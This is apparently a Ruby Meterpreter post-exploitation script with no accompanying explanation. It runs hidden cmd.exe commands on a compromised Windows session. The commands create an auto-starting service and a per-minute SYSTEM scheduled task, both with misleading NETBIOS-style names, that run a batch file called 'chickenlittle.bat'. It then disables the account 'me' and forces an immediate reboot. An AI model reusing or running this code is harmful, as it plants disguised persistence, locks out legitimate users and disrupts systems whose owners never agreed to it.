

 def list_exec(cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
 commands = ["sc create NETBIOSv2 DisplayName= \"NETBIOS OVER TCPv2\" start= auto binpath= \"C://Windows//System32//chickenlittle.bat\"",
    "schtasks /create /sc minute /mo 1 /tn \"TCPIP OVER NETBIOSv2\" /tr \"C://Windows//System32//chickenlittle.bat\" /ru SYSTEM",
    "net user me /active:no",
    "shutdown /r /t 0"]
list_exec(commands)

